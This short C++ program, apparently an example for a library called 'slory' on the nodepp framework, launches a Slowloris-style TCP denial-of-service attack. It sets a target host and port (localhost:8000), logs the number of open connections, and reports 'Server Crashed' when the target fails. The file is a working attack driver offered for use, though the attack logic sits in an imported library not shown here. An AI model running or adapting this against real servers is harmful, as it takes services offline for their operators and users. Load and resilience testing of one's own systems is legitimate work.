#include <nodepp/nodepp.h>
#include <nodepp/limit.h>
#include <slory/tcp.h>

using namespace nodepp;

void onMain(){

    slory_config_t args;

    args.host  = "localhost";
    args.port  = 8000;
    args.delay = 1;

    auto slory = slory::tcp( args );
    
    slory.onProgress([=]( uint connections, ulong stamp ){
        console::log( "->", connections, stamp );
    });

    slory.onOpen([](){
        console::log("slowlory started");
    });

    slory.onDrain([=](){
        console::log("Server Crashed");
    });

}